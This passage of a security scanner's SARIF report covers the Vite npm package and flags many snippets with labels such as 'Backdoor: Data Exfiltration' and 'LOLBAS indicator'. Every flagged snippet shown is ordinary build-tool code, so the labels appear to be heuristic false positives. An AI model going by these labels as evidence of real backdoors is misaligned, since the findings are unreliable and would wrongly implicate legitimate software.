          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/runtime.js"
                },
                "region": {
                  "startLine": 344,
                  "startColumn": 54,
                  "endLine": 344,
                  "endColumn": 59,
                  "snippet": {
                    "text": "    this.hmrClient = hmrClient, this.ownerPath = ownerPath, hmrClient.dataMap.has(ownerPath) || hmrClient.dataMap.set(ownerPath, {});\n    const mod = hmrClient.hotModulesMap.get(ownerPath);\n    mod && (mod.callbacks = []);\n    const staleListeners = hmrClient.ctxToListenersMap.get(ownerPath);\n    if (staleListeners)\n      for (const [event, staleFns] of staleListeners) {\n        const listeners = hmrClient.customListenersMap.get(event);\n",
                    "rendered": {
                      "text": "    this.hmrClient = hmrClient, this.ownerPath = ownerPath, hmrClient.dataMap.has(ownerPath) || hmrClient.dataMap.set(ownerPath, {});\n    const mod = hmrClient.hotModulesMap.get(ownerPath);\n    mod && (mod.callbacks = []);\n    const staleListeners = hmrClient.ctxToListenersMap.get(ownerPath);\n    if (staleListeners)\n      for (const [event, staleFns] of staleListeners) {\n        const listeners = hmrClient.customListenersMap.get(event);\n",
                      "markdown": "`    this.hmrClient = hmrClient, this.ownerPath = ownerPath, hmrClient.dataMap.has(ownerPath) || hmrClient.dataMap.set(ownerPath, {});\n    const mod = hmrClient.hotModulesMap.get(ownerPath);\n    mod && (mod.callbacks = []);\n    const staleListeners = hmrClient.ctxToListenersMap.get(ownerPath);\n    if (staleListeners)\n      for (const [event, staleFns] of staleListeners) {\n        const listeners = hmrClient.customListenersMap.get(event);\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/runtime.js"
                },
                "region": {
                  "startLine": 342,
                  "startColumn": 39,
                  "endLine": 342,
                  "endColumn": 44,
                  "snippet": {
                    "text": "class HMRContext {\n  constructor(hmrClient, ownerPath) {\n    this.hmrClient = hmrClient, this.ownerPath = ownerPath, hmrClient.dataMap.has(ownerPath) || hmrClient.dataMap.set(ownerPath, {});\n    const mod = hmrClient.hotModulesMap.get(ownerPath);\n    mod && (mod.callbacks = []);\n    const staleListeners = hmrClient.ctxToListenersMap.get(ownerPath);\n    if (staleListeners)\n",
                    "rendered": {
                      "text": "class HMRContext {\n  constructor(hmrClient, ownerPath) {\n    this.hmrClient = hmrClient, this.ownerPath = ownerPath, hmrClient.dataMap.has(ownerPath) || hmrClient.dataMap.set(ownerPath, {});\n    const mod = hmrClient.hotModulesMap.get(ownerPath);\n    mod && (mod.callbacks = []);\n    const staleListeners = hmrClient.ctxToListenersMap.get(ownerPath);\n    if (staleListeners)\n",
                      "markdown": "`class HMRContext {\n  constructor(hmrClient, ownerPath) {\n    this.hmrClient = hmrClient, this.ownerPath = ownerPath, hmrClient.dataMap.has(ownerPath) || hmrClient.dataMap.set(ownerPath, {});\n    const mod = hmrClient.hotModulesMap.get(ownerPath);\n    mod && (mod.callbacks = []);\n    const staleListeners = hmrClient.ctxToListenersMap.get(ownerPath);\n    if (staleListeners)\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/runtime.js"
                },
                "region": {
                  "startLine": 324,
                  "startColumn": 20,
                  "endLine": 324,
                  "endColumn": 25,
                  "snippet": {
                    "text": "    return invalidated;\n  }\n  getSourceMap(moduleId) {\n    const mod = this.get(moduleId);\n    if (mod.map) return mod.map;\n    if (!mod.meta || !(\"code\" in mod.meta)) return null;\n    const mapString = VITE_RUNTIME_SOURCEMAPPING_REGEXP.exec(mod.meta.code)?.[1];\n",
                    "rendered": {
                      "text": "    return invalidated;\n  }\n  getSourceMap(moduleId) {\n    const mod = this.get(moduleId);\n    if (mod.map) return mod.map;\n    if (!mod.meta || !(\"code\" in mod.meta)) return null;\n    const mapString = VITE_RUNTIME_SOURCEMAPPING_REGEXP.exec(mod.meta.code)?.[1];\n",
                      "markdown": "`    return invalidated;\n  }\n  getSourceMap(moduleId) {\n    const mod = this.get(moduleId);\n    if (mod.map) return mod.map;\n    if (!mod.meta || !(\"code\" in mod.meta)) return null;\n    const mapString = VITE_RUNTIME_SOURCEMAPPING_REGEXP.exec(mod.meta.code)?.[1];\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/runtime.js"
                },
                "region": {
                  "startLine": 305,
                  "startColumn": 23,
                  "endLine": 305,
                  "endColumn": 28,
                  "snippet": {
                    "text": "      const id = this.normalize(_id);\n      if (invalidated.has(id)) continue;\n      invalidated.add(id);\n      const mod = super.get(id);\n      mod?.importers && this.invalidateDepTree(mod.importers, invalidated), super.delete(id);\n    }\n    return invalidated;\n",
                    "rendered": {
                      "text": "      const id = this.normalize(_id);\n      if (invalidated.has(id)) continue;\n      invalidated.add(id);\n      const mod = super.get(id);\n      mod?.importers && this.invalidateDepTree(mod.importers, invalidated), super.delete(id);\n    }\n    return invalidated;\n",
                      "markdown": "`      const id = this.normalize(_id);\n      if (invalidated.has(id)) continue;\n      invalidated.add(id);\n      const mod = super.get(id);\n      mod?.importers && this.invalidateDepTree(mod.importers, invalidated), super.delete(id);\n    }\n    return invalidated;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/runtime.js"
                },
                "region": {
                  "startLine": 276,
                  "startColumn": 23,
                  "endLine": 276,
                  "endColumn": 28,
                  "snippet": {
                    "text": "    return this.deleteByModuleId(this.normalize(fsPath));\n  }\n  invalidate(id) {\n    const module = this.get(id);\n    module.evaluated = !1, module.meta = void 0, module.map = void 0, module.promise = void 0, module.exports = void 0, module.imports?.clear();\n  }\n  isImported({\n",
                    "rendered": {
                      "text": "    return this.deleteByModuleId(this.normalize(fsPath));\n  }\n  invalidate(id) {\n    const module = this.get(id);\n    module.evaluated = !1, module.meta = void 0, module.map = void 0, module.promise = void 0, module.exports = void 0, module.imports?.clear();\n  }\n  isImported({\n",
                      "markdown": "`    return this.deleteByModuleId(this.normalize(fsPath));\n  }\n  invalidate(id) {\n    const module = this.get(id);\n    module.evaluated = !1, module.meta = void 0, module.map = void 0, module.promise = void 0, module.exports = void 0, module.imports?.clear();\n  }\n  isImported({\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/runtime.js"
                },
                "region": {
                  "startLine": 260,
                  "startColumn": 21,
                  "endLine": 260,
                  "endColumn": 26,
                  "snippet": {
                    "text": "  }\n  getByModuleId(modulePath) {\n    super.has(modulePath) || this.setByModuleId(modulePath, {});\n    const mod = super.get(modulePath);\n    return mod.imports || Object.assign(mod, {\n      imports: /* @__PURE__ */ new Set(),\n      importers: /* @__PURE__ */ new Set()\n",
                    "rendered": {
                      "text": "  }\n  getByModuleId(modulePath) {\n    super.has(modulePath) || this.setByModuleId(modulePath, {});\n    const mod = super.get(modulePath);\n    return mod.imports || Object.assign(mod, {\n      imports: /* @__PURE__ */ new Set(),\n      importers: /* @__PURE__ */ new Set()\n",
                      "markdown": "`  }\n  getByModuleId(modulePath) {\n    super.has(modulePath) || this.setByModuleId(modulePath, {});\n    const mod = super.get(modulePath);\n    return mod.imports || Object.assign(mod, {\n      imports: /* @__PURE__ */ new Set(),\n      importers: /* @__PURE__ */ new Set()\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/runtime.js"
                },
                "region": {
                  "startLine": 250,
                  "startColumn": 83,
                  "endLine": 250,
                  "endColumn": 88,
                  "snippet": {
                    "text": "   * Assign partial data to the map\n   */\n  update(fsPath, mod) {\n    return fsPath = this.normalize(fsPath), super.has(fsPath) ? Object.assign(super.get(fsPath), mod) : this.setByModuleId(fsPath, mod), this;\n  }\n  setByModuleId(modulePath, mod) {\n    return super.set(modulePath, mod);\n",
                    "rendered": {
                      "text": "   * Assign partial data to the map\n   */\n  update(fsPath, mod) {\n    return fsPath = this.normalize(fsPath), super.has(fsPath) ? Object.assign(super.get(fsPath), mod) : this.setByModuleId(fsPath, mod), this;\n  }\n  setByModuleId(modulePath, mod) {\n    return super.set(modulePath, mod);\n",
                      "markdown": "`   * Assign partial data to the map\n   */\n  update(fsPath, mod) {\n    return fsPath = this.normalize(fsPath), super.has(fsPath) ? Object.assign(super.get(fsPath), mod) : this.setByModuleId(fsPath, mod), this;\n  }\n  setByModuleId(modulePath, mod) {\n    return super.set(modulePath, mod);\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/bin/openChrome.applescript"
                },
                "region": {
                  "startLine": 5,
                  "startColumn": 12,
                  "endLine": 6,
                  "snippet": {
                    "text": "Copyright (c) 2015-present, Facebook, Inc.\n\nThis source code is licensed under the MIT license found in the\nLICENSE file at\nhttps://github.com/facebookincubator/create-react-app/blob/master/LICENSE\n*)\n\nproperty targetTab: null\n",
                    "rendered": {
                      "text": "Copyright (c) 2015-present, Facebook, Inc.\n\nThis source code is licensed under the MIT license found in the\nLICENSE file at\nhttps://github.com/facebookincubator/create-react-app/blob/master/LICENSE\n*)\n\nproperty targetTab: null\n",
                      "markdown": "`Copyright (c) 2015-present, Facebook, Inc.\n\nThis source code is licensed under the MIT license found in the\nLICENSE file at\nhttps://github.com/facebookincubator/create-react-app/blob/master/LICENSE\n*)\n\nproperty targetTab: null\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/bin/openChrome.applescript"
                },
                "region": {
                  "startLine": 71,
                  "startColumn": 8,
                  "endLine": 71,
                  "endColumn": 14,
                  "snippet": {
                    "text": "on lookupTabWithUrl(lookupUrl)\n  using terms from application \"Google Chrome\"\n    tell application theProgram\n      -- Find a tab with the given url\n      set found to false\n      set theTabIndex to -1\n      repeat with theWindow in every window\n",
                    "rendered": {
                      "text": "on lookupTabWithUrl(lookupUrl)\n  using terms from application \"Google Chrome\"\n    tell application theProgram\n      -- Find a tab with the given url\n      set found to false\n      set theTabIndex to -1\n      repeat with theWindow in every window\n",
                      "markdown": "`on lookupTabWithUrl(lookupUrl)\n  using terms from application \"Google Chrome\"\n    tell application theProgram\n      -- Find a tab with the given url\n      set found to false\n      set theTabIndex to -1\n      repeat with theWindow in every window\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/bin/openChrome.applescript"
                },
                "region": {
                  "startLine": 67,
                  "startColumn": 31,
                  "endLine": 67,
                  "endColumn": 36,
                  "snippet": {
                    "text": "-- Function:\n-- Lookup tab with given url\n-- if found, store tab, index, and window in properties\n-- (properties were declared on top of file)\non lookupTabWithUrl(lookupUrl)\n  using terms from application \"Google Chrome\"\n    tell application theProgram\n",
                    "rendered": {
                      "text": "-- Function:\n-- Lookup tab with given url\n-- if found, store tab, index, and window in properties\n-- (properties were declared on top of file)\non lookupTabWithUrl(lookupUrl)\n  using terms from application \"Google Chrome\"\n    tell application theProgram\n",
                      "markdown": "`-- Function:\n-- Lookup tab with given url\n-- if found, store tab, index, and window in properties\n-- (properties were declared on top of file)\non lookupTabWithUrl(lookupUrl)\n  using terms from application \"Google Chrome\"\n    tell application theProgram\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/bin/openChrome.applescript"
                },
                "region": {
                  "startLine": 44,
                  "startColumn": 18,
                  "endLine": 44,
                  "endColumn": 24,
                  "snippet": {
                    "text": "\n      -- 2: Looking for Empty tab\n      -- In case debugging tab was not found\n      -- We try to find an empty tab instead\n      set found to my lookupTabWithUrl(\"chrome://newtab/\")\n      if found then\n        set targetWindow's active tab index to targetTabIndex\n",
                    "rendered": {
                      "text": "\n      -- 2: Looking for Empty tab\n      -- In case debugging tab was not found\n      -- We try to find an empty tab instead\n      set found to my lookupTabWithUrl(\"chrome://newtab/\")\n      if found then\n        set targetWindow's active tab index to targetTabIndex\n",
                      "markdown": "`\n      -- 2: Looking for Empty tab\n      -- In case debugging tab was not found\n      -- We try to find an empty tab instead\n      set found to my lookupTabWithUrl(\"chrome://newtab/\")\n      if found then\n        set targetWindow's active tab index to targetTabIndex\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/index.d.ts"
                },
                "region": {
                  "startLine": 575,
                  "startColumn": 40,
                  "endLine": 575,
                  "endColumn": 48,
                  "snippet": {
                    "text": "    changeOrigin?: boolean | undefined\n    /** specify whether you want to keep letter case of response header key */\n    preserveHeaderKeyCase?: boolean | undefined\n    /** Basic authentication i.e. 'user:password' to compute an Authorization header. */\n    auth?: string | undefined\n    /** Rewrites the location hostname on (301 / 302 / 307 / 308) redirects, Default: null. */\n    hostRewrite?: string | undefined\n",
                    "rendered": {
                      "text": "    changeOrigin?: boolean | undefined\n    /** specify whether you want to keep letter case of response header key */\n    preserveHeaderKeyCase?: boolean | undefined\n    /** Basic authentication i.e. 'user:password' to compute an Authorization header. */\n    auth?: string | undefined\n    /** Rewrites the location hostname on (301 / 302 / 307 / 308) redirects, Default: null. */\n    hostRewrite?: string | undefined\n",
                      "markdown": "`    changeOrigin?: boolean | undefined\n    /** specify whether you want to keep letter case of response header key */\n    preserveHeaderKeyCase?: boolean | undefined\n    /** Basic authentication i.e. 'user:password' to compute an Authorization header. */\n    auth?: string | undefined\n    /** Rewrites the location hostname on (301 / 302 / 307 / 308) redirects, Default: null. */\n    hostRewrite?: string | undefined\n`"
                    }
                  },
                  "sourceLanguage": "typescript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/index.d.ts"
                },
                "region": {
                  "startLine": 2335,
                  "startColumn": 54,
                  "endLine": 2335,
                  "endColumn": 67,
                  "snippet": {
                    "text": "     * syntax transformation and does not cover polyfills (except for dynamic\n     * import)\n     *\n     * Default: 'modules' - Similar to `@babel/preset-env`'s targets.esmodules,\n     * transpile targeting browsers that natively support dynamic es module imports.\n     * https://caniuse.com/es6-module-dynamic-import\n     *\n",
                    "rendered": {
                      "text": "     * syntax transformation and does not cover polyfills (except for dynamic\n     * import)\n     *\n     * Default: 'modules' - Similar to `@babel/preset-env`'s targets.esmodules,\n     * transpile targeting browsers that natively support dynamic es module imports.\n     * https://caniuse.com/es6-module-dynamic-import\n     *\n",
                      "markdown": "`     * syntax transformation and does not cover polyfills (except for dynamic\n     * import)\n     *\n     * Default: 'modules' - Similar to `@babel/preset-env`'s targets.esmodules,\n     * transpile targeting browsers that natively support dynamic es module imports.\n     * https://caniuse.com/es6-module-dynamic-import\n     *\n`"
                    }
                  },
                  "sourceLanguage": "typescript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/index.d.ts"
                },
                "region": {
                  "startLine": 387,
                  "startColumn": 4,
                  "endLine": 387,
                  "endColumn": 12,
                  "snippet": {
                    "text": "    host: string\n    port: number\n    protocol?: string | undefined\n    hostname?: string | undefined\n    socketPath?: string | undefined\n    key?: string | undefined\n    passphrase?: string | undefined\n",
                    "rendered": {
                      "text": "    host: string\n    port: number\n    protocol?: string | undefined\n    hostname?: string | undefined\n    socketPath?: string | undefined\n    key?: string | undefined\n    passphrase?: string | undefined\n",
                      "markdown": "`    host: string\n    port: number\n    protocol?: string | undefined\n    hostname?: string | undefined\n    socketPath?: string | undefined\n    key?: string | undefined\n    passphrase?: string | undefined\n`"
                    }
                  },
                  "sourceLanguage": "typescript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/index.d.ts"
                },
                "region": {
                  "startLine": 369,
                  "startColumn": 25,
                  "endLine": 369,
                  "endColumn": 33,
                  "snippet": {
                    "text": "      backlog?: number,\n      callback?: Function,\n    ): http.Server\n    listen(port: number, hostname?: string, callback?: Function): http.Server\n    listen(path: string, callback?: Function): http.Server\n    listen(handle: any, listeningListener?: Function): http.Server\n  }\n",
                    "rendered": {
                      "text": "      backlog?: number,\n      callback?: Function,\n    ): http.Server\n    listen(port: number, hostname?: string, callback?: Function): http.Server\n    listen(path: string, callback?: Function): http.Server\n    listen(handle: any, listeningListener?: Function): http.Server\n  }\n",
                      "markdown": "`      backlog?: number,\n      callback?: Function,\n    ): http.Server\n    listen(port: number, hostname?: string, callback?: Function): http.Server\n    listen(path: string, callback?: Function): http.Server\n    listen(handle: any, listeningListener?: Function): http.Server\n  }\n`"
                    }
                  },
                  "sourceLanguage": "typescript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/index.d.ts"
                },
                "region": {
                  "startLine": 365,
                  "startColumn": 6,
                  "endLine": 365,
                  "endColumn": 14,
                  "snippet": {
                    "text": "     */\n    listen(\n      port: number,\n      hostname?: string,\n      backlog?: number,\n      callback?: Function,\n    ): http.Server\n",
                    "rendered": {
                      "text": "     */\n    listen(\n      port: number,\n      hostname?: string,\n      backlog?: number,\n      callback?: Function,\n    ): http.Server\n",
                      "markdown": "`     */\n    listen(\n      port: number,\n      hostname?: string,\n      backlog?: number,\n      callback?: Function,\n    ): http.Server\n`"
                    }
                  },
                  "sourceLanguage": "typescript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/index.cjs"
                },
                "region": {
                  "startLine": 32,
                  "startColumn": 30,
                  "endLine": 32,
                  "endColumn": 36,
                  "snippet": {
                    "text": "  const log = process.env.VITE_CJS_TRACE ? console.trace : console.warn\n  log(\n    yellow(\n      `The CJS build of Vite's Node API is deprecated. See https://vitejs.dev/guide/troubleshooting.html#vite-cjs-node-api-deprecated for more details.`,\n    ),\n  )\n}\n",
                    "rendered": {
                      "text": "  const log = process.env.VITE_CJS_TRACE ? console.trace : console.warn\n  log(\n    yellow(\n      `The CJS build of Vite's Node API is deprecated. See https://vitejs.dev/guide/troubleshooting.html#vite-cjs-node-api-deprecated for more details.`,\n    ),\n  )\n}\n",
                      "markdown": "`  const log = process.env.VITE_CJS_TRACE ? console.trace : console.warn\n  log(\n    yellow(\n      `The CJS build of Vite's Node API is deprecated. See https://vitejs.dev/guide/troubleshooting.html#vite-cjs-node-api-deprecated for more details.`,\n    ),\n  )\n}\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/index.cjs"
                },
                "region": {
                  "startLine": 29,
                  "startColumn": 14,
                  "endLine": 29,
                  "endColumn": 25,
                  "snippet": {
                    "text": "function warnCjsUsage() {\n  if (process.env.VITE_CJS_IGNORE_WARNING) return\n  const yellow = (str) => `\\u001b[33m${str}\\u001b[39m`\n  const log = process.env.VITE_CJS_TRACE ? console.trace : console.warn\n  log(\n    yellow(\n      `The CJS build of Vite's Node API is deprecated. See https://vitejs.dev/guide/troubleshooting.html#vite-cjs-node-api-deprecated for more details.`,\n",
                    "rendered": {
                      "text": "function warnCjsUsage() {\n  if (process.env.VITE_CJS_IGNORE_WARNING) return\n  const yellow = (str) => `\\u001b[33m${str}\\u001b[39m`\n  const log = process.env.VITE_CJS_TRACE ? console.trace : console.warn\n  log(\n    yellow(\n      `The CJS build of Vite's Node API is deprecated. See https://vitejs.dev/guide/troubleshooting.html#vite-cjs-node-api-deprecated for more details.`,\n",
                      "markdown": "`function warnCjsUsage() {\n  if (process.env.VITE_CJS_IGNORE_WARNING) return\n  const yellow = (str) => `\\u001b[33m${str}\\u001b[39m`\n  const log = process.env.VITE_CJS_TRACE ? console.trace : console.warn\n  log(\n    yellow(\n      `The CJS build of Vite's Node API is deprecated. See https://vitejs.dev/guide/troubleshooting.html#vite-cjs-node-api-deprecated for more details.`,\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/index.cjs"
                },
                "region": {
                  "startLine": 27,
                  "startColumn": 6,
                  "endLine": 27,
                  "endColumn": 17,
                  "snippet": {
                    "text": "})\n\nfunction warnCjsUsage() {\n  if (process.env.VITE_CJS_IGNORE_WARNING) return\n  const yellow = (str) => `\\u001b[33m${str}\\u001b[39m`\n  const log = process.env.VITE_CJS_TRACE ? console.trace : console.warn\n  log(\n",
                    "rendered": {
                      "text": "})\n\nfunction warnCjsUsage() {\n  if (process.env.VITE_CJS_IGNORE_WARNING) return\n  const yellow = (str) => `\\u001b[33m${str}\\u001b[39m`\n  const log = process.env.VITE_CJS_TRACE ? console.trace : console.warn\n  log(\n",
                      "markdown": "`})\n\nfunction warnCjsUsage() {\n  if (process.env.VITE_CJS_IGNORE_WARNING) return\n  const yellow = (str) => `\\u001b[33m${str}\\u001b[39m`\n  const log = process.env.VITE_CJS_TRACE ? console.trace : console.warn\n  log(\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node-cjs/publicUtils.cjs"
                },
                "region": {
                  "startLine": 6053,
                  "startColumn": 8,
                  "endLine": 6053,
                  "endColumn": 16,
                  "snippet": {
                    "text": "  })\n}\n\nfunction expand (options) {\n  let processEnv = process.env;\n  if (options && options.processEnv != null) {\n    processEnv = options.processEnv;\n",
                    "rendered": {
                      "text": "  })\n}\n\nfunction expand (options) {\n  let processEnv = process.env;\n  if (options && options.processEnv != null) {\n    processEnv = options.processEnv;\n",
                      "markdown": "`  })\n}\n\nfunction expand (options) {\n  let processEnv = process.env;\n  if (options && options.processEnv != null) {\n    processEnv = options.processEnv;\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node-cjs/publicUtils.cjs"
                },
                "region": {
                  "startLine": 5911,
                  "startColumn": 67,
                  "endLine": 5911,
                  "endColumn": 71,
                  "snippet": {
                    "text": "\n  // dotenvKey exists but .env.vault file does not exist\n  if (!vaultPath) {\n    _warn(`You set DOTENV_KEY but you are missing a .env.vault file at ${vaultPath}. Did you forget to build it?`);\n\n    return DotenvModule.configDotenv(options)\n  }\n",
                    "rendered": {
                      "text": "\n  // dotenvKey exists but .env.vault file does not exist\n  if (!vaultPath) {\n    _warn(`You set DOTENV_KEY but you are missing a .env.vault file at ${vaultPath}. Did you forget to build it?`);\n\n    return DotenvModule.configDotenv(options)\n  }\n",
                      "markdown": "`\n  // dotenvKey exists but .env.vault file does not exist\n  if (!vaultPath) {\n    _warn(`You set DOTENV_KEY but you are missing a .env.vault file at ${vaultPath}. Did you forget to build it?`);\n\n    return DotenvModule.configDotenv(options)\n  }\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node-cjs/publicUtils.cjs"
                },
                "region": {
                  "startLine": 5675,
                  "startColumn": 6,
                  "endLine": 5675,
                  "endColumn": 14,
                  "snippet": {
